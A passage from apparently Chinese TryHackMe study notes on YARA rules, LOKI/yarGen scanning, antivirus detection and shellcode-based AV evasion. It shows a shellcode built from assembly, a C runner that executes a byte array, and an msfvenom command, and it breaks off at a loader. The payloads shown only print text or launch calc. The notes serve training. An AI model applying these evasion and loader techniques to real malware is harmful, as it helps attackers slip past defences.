style="color: #ABB2BF">        </span><span style="color: #98C379">$hello_world and filesize &lt; 10KB</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h4 id="Yara-规则剖析"><a href="#Yara-规则剖析" class="headerlink" title="Yara 规则剖析"></a>Yara 规则剖析</h4><p><a href="https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd">handy cheatsheet</a></p><img src="/thm_rthe/1gThGNPenpT-AS-gjr8JCtA.png" class="" title="a picture showing a Yara rule cheatsheet developed by fr0gger_"><h3 id="Yara-模块"><a href="#Yara-模块" class="headerlink" title="Yara 模块"></a>Yara 模块</h3><h4 id="Cuckoo-Sandbox"><a href="#Cuckoo-Sandbox" class="headerlink" title="Cuckoo Sandbox"></a>Cuckoo Sandbox</h4><p>Cuckoo Sandbox 是一个自动化的恶意软件分析环境。此模块允许您根据 Cuckoo Sandbox 中发现的行为生成 Yara 规则。由于此环境会执行恶意软件，因此您可以根据特定行为（例如运行时字符串等）创建规则。</p><h4 id="Python-PE"><a href="#Python-PE" class="headerlink" title="Python PE"></a>Python PE</h4><p>Python 的 PE 模块允许你根据 Windows 可移植可执行文件 (PE) 结构的各个部分和元素创建 Yara 规则。</p><h3 id="Yara-工具"><a href="#Yara-工具" class="headerlink" title="Yara 工具"></a>Yara 工具</h3><ul><li>LOKI 是由 Florian Roth 创建&#x2F;编写的免费开源 IOC（入侵指标）扫描器。</li><li>THOR 多平台 IOC 和 YARA 扫描器</li><li>FENRIR<ul><li>一个 bash 脚本</li></ul></li><li>YAYA (<em>Yet Another Yara Automaton</em>)<ul><li>管理规则库用的</li></ul></li></ul><h3 id="使用-LOKI"><a href="#使用-LOKI" class="headerlink" title="使用 LOKI"></a>使用 LOKI</h3><p>LOKI 是一个自动调用 yara 规则进行扫描的工具</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">python loki.py -p .</span></span></code></pre></div></div></figure><h3 id="使用-yarGen-创建-Yara-规则"><a href="#使用-yarGen-创建-Yara-规则" class="headerlink" title="使用 yarGen 创建 Yara 规则"></a>使用 yarGen 创建 Yara 规则</h3><p>yarGen 是一个 YARA 规则生成器，它能根据恶意软件文件中发现的字符串创建 YARA 规则，同时删除所有在正常软件文件中也出现的字符串。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">yarGen.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/home/cmnatic/suspicious-files/file2</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--excludegood</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/home/cmnatic/suspicious-files/file2.yar</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">调用</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">loki</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">测试我们的文件</span></span><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">../tools/Loki/loki.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.</span></span></code></pre></div></div></figure><h3 id="修改-Yara-规则"><a href="#修改-Yara-规则" class="headerlink" title="修改 Yara 规则"></a>修改 Yara 规则</h3><p>原来的规则由于是简单的匹配字符串，导致我们扫描文本文件都会造成假阳，所以我们需要修改匹配规则。</p><figure class="shiki yara"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre><code>rule thm_demo_rule {meta:author = "THM: Intro-to-AV-Room"description = "Look at how the Yara rule works with ClamAV"strings:$a = "C:\\Users\\thm\\source\\repos\\AV-Check\\AV-Check\\obj\\Debug\\AV-Check.pdb"condition:$a}</code></pre></div></div></figure><p>这里用一个 Magic Number 来增加一下判断条件，<code>EXE</code> 文件一般是由 <code>4D5A</code> 开始的。</p><p>修改后的规则：</p><figure class="shiki yara"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre><code>rule thm_demo_rule {meta:author = "THM: Intro-to-AV-Room"description = "Look at how the Yara rule works with ClamAV"strings:$a = "C:\\Users\\thm\\source\\repos\\AV-Check\\AV-Check\\obj\\Debug\\AV-Check.pdb"$b = "MZ"condition:$b at 0 and $a}</code></pre></div></div></figure><h2 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h2><p>第一种方法是通过监控 Windows API。检测引擎会检查 Windows 应用程序调用，并使用 Windows Hooks 监控 Windows API 调用。</p><p>第二种动态检测的另一种方法是沙盒。沙盒是一种虚拟化环境，用于运行与主机计算机隔离的恶意文件。这通常在隔离环境中进行，主要目标是分析恶意软件在系统中的行为方式。一旦恶意软件被确认，将根据二进制文件的特性创建唯一的签名和规则。最后，新的更新将被推送到云数据库以供将来使用。</p><p>说实话，比较鸡肋，第一种可以绕过，第二种可以避免。</p><p>还有一种就是行为检测了，异常行为不加白的应用直接拦。</p><h2 id="识别杀毒软件"><a href="#识别杀毒软件" class="headerlink" title="识别杀毒软件"></a>识别杀毒软件</h2><p>房间介绍了开源的轮子 <a href="https://github.com/PwnDexter/SharpEDRChecker">SharpEDRChecker</a>，和房间提供的用 C# 写的，我估计还有一些一行的脚本，毕竟这个就是简单的调系统 API 然后字符串匹配。</p><h1 id="AV-Evasion-Shellcode"><a href="#AV-Evasion-Shellcode" class="headerlink" title="AV Evasion: Shellcode"></a>AV Evasion: Shellcode</h1><p>这个房间介绍免杀技术。</p><h2 id="PE-结构"><a href="#PE-结构" class="headerlink" title="PE 结构"></a>PE 结构</h2><h3 id="什么是-PE"><a href="#什么是-PE" class="headerlink" title="什么是 PE"></a>什么是 PE</h3><p>之前的房间我们已经聊过这个了，丢一张图过来，更多资料可以参考<a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">微软文档</a>。</p><img src="/thm_rthe/ad61ff4aa1d4f649c02348dfa32eb613.png" class="" title="PE Structure"><p>PE 结构中有不同类型的数据容器，每种容器存储不同的数据。</p><ol><li><code>.text</code> 保存程序的<strong>实际代码</strong></li><li><code>.data</code> 保存初始化和定义的变量</li><li><code>.bss</code> 保存未初始化数据（未赋值的声明变量）</li><li><code>.rdata</code> 包含只读数据</li><li><code>.edata</code>包含可导出对象和相关表格信息</li><li><code>.idata</code> 导入对象和相关表格信息</li><li><code>.reloc</code> 图像重定位信息</li><li><code>.rsrc</code> 链接程序使用的外部资源，如图像、图标、嵌入式二进制文件和清单文件，清单文件包含程序版本、作者、公司和版权等所有信息！</li></ol><p>以下是 Windows 加载器读取可执行二进制文件并将其作为进程运行的示例步骤。</p><ol><li>标头部分：DOS、Windows 和可选标头被解析以提供有关 EXE 文件的信息。例如，<ul><li>魔术数字以“MZ”开头，这告诉加载器这是一个 EXE 文件。</li><li>文件签名</li><li>文件是为 x86 还是 x64 CPU 架构编译的。</li><li>创建时间戳。</li></ul></li><li>解析节表详情，例如<ul><li>文件包含的节数。</li></ul></li><li>根据文件内容映射到内存中<ul><li>EntryPoint 地址和 ImageBase 的偏移量。</li><li>RVA：相对虚拟地址，与 Imagebase 相关的地址。</li></ul></li><li>导入、DLL 和其他对象被加载到内存中。</li><li>EntryPoint 地址被定位，主执行函数运行。</li></ol><h3 id="为什么我们要了解-PE"><a href="#为什么我们要了解-PE" class="headerlink" title="为什么我们要了解 PE?"></a>为什么我们要了解 PE?</h3><p>我们会碰到打包和解包，这个就需要我们了解 PE 结构才知道原理。</p><p>另外创建或修改具有针对 Windows 机器的杀毒规避能力的恶意软件，我们需要了解 Windows 可执行文件（PE 文件）的结构以及恶意 shellcode 可以存储的位置。</p><p>我们可以通过定义和初始化 shellcode 变量的方式来控制将 shellcode 存储在哪个数据节中。</p><ol><li>在主函数中将 shellcode 定义为局部变量会将其存储在 .TEXT 部分（和执行的代码存储在一起）。</li><li>将 shellcode 定义为全局变量会将其存储在 .Data 部分。</li><li>另一种技术是将 shellcode 作为原始二进制文件存储在图标图像中，并将其链接到代码中，因此在这种情况下，它会显示在.rsrc Data 节中。</li><li>我们可以添加一个自定义数据节来存储 shellcode。</li></ol><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>Shellcode 是一组精心设计的机器代码指令，用于指示易受攻击的程序运行附加功能，并且在大多数情况下，提供对系统 shell 的访问或创建反向命令 shell。</p><p>一旦 shellcode 被注入到进程中并由易受攻击的软件或程序执行，它就会修改代码运行流程，以更新程序的寄存器和功能，从而执行攻击者的代码。</p><p>它通常用汇编语言编写，并翻译成十六进制操作码（operational codes <strong>opcode</strong>）。编写独特和自定义的 shellcode 有助于显著规避杀毒软件。但是，编写自定义 shellcode 需要在处理汇编语言方面具备出色的知识和技能，这不是一件容易的事！</p><h3 id="Shellcode-入门"><a href="#Shellcode-入门" class="headerlink" title="Shellcode 入门"></a>Shellcode 入门</h3><p>要制作一个 Shellcode，你需要掌握多项技能，包括对 <strong>x86&#x2F;x64 CPU 架构</strong>、<strong>汇编语言</strong>、<strong>C 语言</strong>以及 <strong>Linux&#x2F;Windows 操作系统</strong>的深入理解。</p><p>制作 Shellcode 的核心步骤是<strong>编写汇编代码</strong>，然后将其<strong>编译并提取出机器码</strong>。我们以一个简单的 Shellcode 为例，它将在屏幕上打印字符串 “THM, Rocks!”，然后正常退出程序。这个过程需要用到两个关键的系统调用：</p><ul><li><code>sys_write</code>：用于将数据写入文件描述符（这里是标准输出）。</li><li><code>sys_exit</code>：用于终止程序执行。</li></ul><h4 id="理解系统调用-Syscall"><a href="#理解系统调用-Syscall" class="headerlink" title="理解系统调用 (Syscall)"></a>理解系统调用 (Syscall)</h4><p>系统调用是程序请求操作系统内核执行特定任务的方式。在 64 位 Linux 系统中，每个系统调用都有一个对应的编号，这个编号需要放在 <code>rax</code> 寄存器中。其他参数则通过 <code>rdi</code>、<code>rsi</code> 和 <code>rdx</code> 寄存器传递。</p><table><thead><tr><th><strong>rax</strong></th><th><strong>System Call</strong></th><th><strong>rdi</strong></th><th><strong>rsi</strong></th><th><strong>rdx</strong></th></tr></thead><tbody><tr><td>0x1</td><td>sys_write</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td></tr><tr><td>0x3c</td><td>sys_exit</td><td>int error_code</td><td></td><td></td></tr></tbody></table><p>上表告诉我们，要使用系统调用来调用 <code>sys_write</code> 和 <code>sys_exit</code> 函数，我们需要在不同的处理器寄存器中设置哪些值。对于 64 位 Linux，<code>rax</code> 寄存器用于指示我们希望调用的内核函数。将 <code>rax</code> 设置为 0x1 会使内核执行 <code>sys_write</code>，将 <code>rax</code> 设置为 0x3c 会使内核执行 <code>sys_exit</code>。这两个函数都需要一些参数才能工作，这些参数可以通过 <code>rdi</code>、<code>rsi</code> 和 <code>rdx</code> 寄存器设置。</p><ul><li>**<code>sys_write</code> (0x1)**：<ul><li>**<code>rdi</code> (文件描述符)**：指定要写入的目标。<code>1</code> 通常代表标准输出（屏幕）。</li><li>**<code>rsi</code> (缓冲区指针)**：指向我们要打印的字符串的内存地址。</li><li>**<code>rdx</code> (计数)**：要打印的字符串的字节数。</li></ul></li><li>**<code>sys_exit</code> (0x3c)**：<ul><li>**<code>rdi</code> (退出代码)**：指定程序的退出状态。<code>0</code> 表示程序成功执行。</li></ul></li></ul><p>通过在正确的寄存器中设置这些值，我们就可以让程序请求内核完成我们需要的操作。</p><p>你可以在<a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">这里</a>找到可用 64 位 Linux 系统调用的完整参考。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="shiki asm"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">global _start</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">section .text</span></span><span class="line"><span style="color: #61AFEF">_start:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">jmp</span><span style="color: #ABB2BF"> MESSAGE      </span><span style="color: #7F848E; font-style: italic">; 1) 跳转到 MESSAGE</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">GOBACK:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rax</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rdi</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">pop</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rsi</span><span style="color: #ABB2BF">          </span><span style="color: #7F848E; font-style: italic">; 3) 把堆栈的地址取出来放进 RSI 寄存器</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #7F848E; font-style: italic">; 这样就有了我们字符串的地址了</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rdx</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xd</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">syscall</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rax</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3c</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">mov</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">rdi</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">syscall</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">MESSAGE:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">call</span><span style="color: #ABB2BF"> GOBACK       </span><span style="color: #7F848E; font-style: italic">; 2) 他会把下一条指令的地址压入堆栈</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">db</span><span style="color: #ABB2BF"> &quot;THM, Rocks!&quot;, </span><span style="color: #D19A66">0dh</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0ah</span></span></code></pre></div></div></figure><h4 id="汇编代码的工作原理"><a href="#汇编代码的工作原理" class="headerlink" title="汇编代码的工作原理"></a>汇编代码的工作原理</h4><p><strong>准备 <code>sys_write</code> 调用</strong></p><ul><li>我们将 <code>0x1</code> 存入 <strong><code>rax</code></strong> 寄存器，指示要调用 <code>sys_write</code>。</li><li>将 <code>1</code> 存入 <strong><code>rdi</code></strong> 寄存器，指定标准输出（屏幕）。</li><li>将字符串的地址存入 <strong><code>rsi</code></strong> 寄存器。为此，我们使用一个技巧：<code>call GOBACK</code>。<code>call</code> 指令会将下一条指令的地址（即我们消息字符串的起始地址）压入堆栈。然后 <code>pop rsi</code> 将其弹出到 <code>rsi</code> 中。</li><li>将字符串的长度存入 <strong><code>rdx</code></strong> 寄存器。</li><li>最后，使用 <code>syscall</code> 指令执行 <code>sys_write</code>。</li></ul><p><strong>准备 <code>sys_exit</code> 调用</strong></p><ul><li>将 <code>0x3c</code> 存入 <strong><code>rax</code></strong> 寄存器，指示要调用 <code>sys_exit</code>。</li><li>将 <code>0</code> 存入 <strong><code>rdi</code></strong> 寄存器，表示程序成功退出。</li><li>使用 <code>syscall</code> 指令执行 <code>sys_exit</code>。</li></ul><p><strong>字符串存储</strong></p><ul><li>我们的消息字符串“THM, Rocks!”以及换行符 <code>0d, 0a</code> 都被存储在汇编代码的末尾，这样才能利用 <code>call</code> 指令来获取其地址。</li></ul><h4 id="生成与测试-Shellcode"><a href="#生成与测试-Shellcode" class="headerlink" title="生成与测试 Shellcode"></a>生成与测试 Shellcode</h4><p>一旦汇编代码编写完成，我们就可以将其编译并提取为 Shellcode：</p><ol><li><strong>编译与链接</strong>：使用 <code>nasm</code> 编译 <code>.asm</code> 文件，然后用 <code>ld</code> 链接，生成可执行文件 <code>thm</code>。</li></ol><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">编译</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">链接</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">执行</span></span><span class="line"><span style="color: #61AFEF">nasm</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">elf64</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.asm</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">ld</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.o</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">./thm</span></span></code></pre></div></div></figure><ol start="2"><li><strong>提取 Shellcode</strong>：使用 <code>objdump</code> 查看编译后的二进制文件的 <code>.text</code> 段，然后用 <code>objcopy</code> 将 <code>.text</code> 段以纯二进制格式提取出来。</li></ol><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">objdump</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm</span></span><span class="line"><span style="color: #61AFEF">objcopy</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-j</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.text</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-O</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">binary</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.text</span></span></code></pre></div></div></figure><p><strong>3. 转换为 C 语言格式</strong>：使用 <code>xxd</code> 命令将二进制文件 <code>thm.text</code> 转换成 C 语言数组的十六进制表示。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">xxd</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.text</span></span></code></pre></div></div></figure><p>现在就从汇编代码中生成了我们的 shellcode，是不是很有趣，可以测试一下 shellcode 有没有用，注入 C 程序试试。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">**</span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> message</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">eb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">1e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">bf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ba</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">05</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">bf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">05</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">48</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">52</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">6f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">63</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">6b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">73</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">21</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0a</span></span><span class="line"><span style="color: #ABB2BF">    };</span></span><span class="line"><span style="color: #ABB2BF">    </span></span><span class="line"><span style="color: #ABB2BF">    (</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)())message)();</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>最后，使用 <code>gcc</code> 编译并执行这个 C 程序。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">gcc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-g</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Wall</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-z</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">execstack</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.c</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmx</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">./thmx</span></span></code></pre></div></div></figure><h3 id="Shellcode-利用"><a href="#Shellcode-利用" class="headerlink" title="Shellcode 利用"></a>Shellcode 利用</h3><h4 id="使用-Msfvenom-生成-Shellcode"><a href="#使用-Msfvenom-生成-Shellcode" class="headerlink" title="使用 Msfvenom 生成 Shellcode"></a>使用 Msfvenom 生成 Shellcode</h4><p>第一个没什么好说的，msf 指定输出格式生成</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/exec</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd=calc.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c</span></span></code></pre></div></div></figure><h4 id="Shellcode-加载器"><a href="#Shellcode-加载器" class="headerlink" title="Shellcode 加载器"></a>Shellcode 加载器</h4><p>Shellcode 本身无法独立执行，它需要一个<strong>加载器（Loader）</strong>。加载器是一个简单的程序，其唯一任务就是将 Shellcode 放入内存并执行它。</p><figure class="shiki c"><div class='codeblock'><div 